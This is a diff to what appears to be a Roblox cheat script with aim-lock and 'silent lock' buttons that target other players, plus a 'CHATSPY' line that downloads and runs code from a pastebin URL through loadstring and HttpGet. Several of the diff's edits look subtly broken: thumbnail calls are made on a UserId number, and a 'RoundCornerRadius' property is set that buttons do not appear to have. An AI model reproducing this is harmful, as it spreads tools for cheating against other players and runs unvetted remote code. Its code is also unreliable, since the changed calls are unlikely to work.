@@ -29,6 +29,8 @@ local prediction = 0.311505
 
 -- CHATSPY
 loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
+local rlBtn = game:GetService("Players").LocalPlayer.PlayerGui.gui["mobile ppl"].rl
+rlBtn.Size = UDim2.new(0, 60, 0, 60)
 
 local function getFullUser(input)
     user = nil
@@ -156,7 +158,7 @@ end
 local function LockNotif()
     if user then
         local succ, pfp = pcall(function()
-            return game.Players[user]:GetUserThumbnailAsync()
+            return game.Players[user].UserId:GetUserThumbnailAsync()
         end)
         game.StarterGui:SetCore("SendNotification", {
             Title = "Lock Notification",
@@ -387,6 +389,7 @@ tab3.newButton("Lock Button", "Creates a new lock button.", function()
     btn.Text = "Lock"
     btn.TextColor3 = Color3.new(1,1,1)
     btn.TextSize = 18
+    btn.RoundCornerRadius = 0.5
     
     btn.MouseButton1Click:Connect(function()
         if lock then
@@ -420,10 +423,11 @@ tab3.newButton("Silent Lock", "Locks on the closest person.", function()
     silentBtn.TextColor3 = Color3.new(1,1,1)
     silentBtn.TextSize = 16
     silentBtn.TextTransparency = 0.132
+    silentBtn.RoundCornerRadius = 0.5
     
     silentBtn.MouseButton1Click:Connect(function()
         local succ, pfp = pcall(function()
-            return game.Players[getClosest()]:GetUserThumbnailAsync()
+            return game.Players[getClosest().Name].UserId:GetUserThumbnailAsync()
         end)
         if not silent then
             silent = true
